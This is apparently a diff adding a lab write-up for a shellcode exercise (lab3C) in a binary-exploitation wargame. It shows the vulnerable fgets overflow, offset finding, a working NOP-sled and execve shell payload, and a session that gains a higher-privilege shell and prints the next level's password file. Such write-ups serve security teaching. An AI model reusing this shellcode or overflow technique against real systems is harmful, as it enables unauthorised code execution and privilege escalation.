@@ -1,0 +1,55 @@
+Shellcode lab3c
+---------------
+ASLR off
+
+Vulnerable Code
+
+char a_user_name[100];
+char a_user_pass[64] = {0};
+
+fgets(a_user_name, 0x100, stdin);		// strlen(256) overflow 156 bytes
+fgets(a_user_pass, 0x64, stdin);		// strlen(100) decimal
+
+
+# Overflow will return with an overflow ESP
+ ► 0x8048833 <main+163>    call   fgets@plt <0x80485f0>                                        │
+        s: 0xffffd25c ◂— 0x0                                                                   │    /* prompt for admin password - read 64 bytes */                                          
+        n: 0x64                                                                                │    printf("Enter Password: \n");
+        stream: 0xf7f9a5c0 (_IO_2_1_stdin_) ◂— mov    byte ptr [eax], ah /* 0xfbad2088 */
+
+
+# main+228 ret to overflow
+ ► 0x8048874 <main+228>    ret    <0x41414141>
+
+
+# pattern_create -l 400
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
+root@kali:~# pattern_offset -q 0x37634136
+[*] Exact match at offset 80
+
+
+r < <(python -c 'print "rpisec"; print "\x90" * (80-33) + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x16\x70\xfd\xb7"')
+r.interactive()
+
+
+
+
+$ (python -c 'print "rpisec"; print "\x90" * (80-33) + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x16\x70\xfd\xb7"';cat) | ./lab3C 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+id
+uid=1010(lab3C) gid=1011(lab3C) euid=1011(lab3B) groups=1012(lab3B),1001(gameuser),1011(lab3C)
+cd /home        
+ls
+gameadmin  lab2B    lab3end  lab5B    lab6end  lab8C	lecture_priv
+lab1A	   lab2C    lab4A    lab5C    lab7A    lab8end	project1
+lab1B	   lab2end  lab4B    lab5end  lab7C    lab9A	project1_priv
+lab1C	   lab3A    lab4C    lab6A    lab7end  lab9C	project2
+lab1end    lab3B    lab4end  lab6B    lab8A    lab9end	project2_priv
+lab2A	   lab3C    lab5A    lab6C    lab8B    lecture
+cat lab3B/.pass
+th3r3_iz_n0_4dm1ns_0n1y_U!
